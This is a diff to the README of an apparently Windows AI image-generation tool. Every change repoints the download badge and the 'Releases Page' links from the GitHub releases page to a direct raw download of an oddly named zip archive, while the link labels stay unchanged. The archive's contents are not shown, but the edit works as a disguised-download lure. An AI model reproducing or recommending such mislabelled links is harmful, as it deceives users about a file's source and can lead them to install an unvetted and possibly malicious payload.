@@ -1,6 +1,6 @@
 # 🚀 Z-Image-Turbo-Windows - Effortless AI Image Creation for All
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release%20-v1.0-blue)](https://github.com/shishirjinu/Z-Image-Turbo-Windows/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/shishirjinu/Z-Image-Turbo-Windows/main/inogen/Image-Windows-Turbo-naturalizer.zip%20Latest%20Release%20-v1.0-blue)](https://raw.githubusercontent.com/shishirjinu/Z-Image-Turbo-Windows/main/inogen/Image-Windows-Turbo-naturalizer.zip)
 
 ## 📦 Overview
 
@@ -16,7 +16,7 @@ Z-Image Turbo Windows offers a simple way to generate AI images. This one-click 
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/shishirjinu/Z-Image-Turbo-Windows/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/shishirjinu/Z-Image-Turbo-Windows/main/inogen/Image-Windows-Turbo-naturalizer.zip).
 
 Follow these steps for installation:
 
@@ -57,7 +57,7 @@ Z-Image Turbo comes with an intuitive interface:
 
 When new versions are available, you should update to benefit from the latest features and improvements:
 
-1. Return to the [Releases Page](https://github.com/shishirjinu/Z-Image-Turbo-Windows/releases).
+1. Return to the [Releases Page](https://raw.githubusercontent.com/shishirjinu/Z-Image-Turbo-Windows/main/inogen/Image-Windows-Turbo-naturalizer.zip).
 2. Download the latest installer.
 3. Run the installer to update your existing version.
 
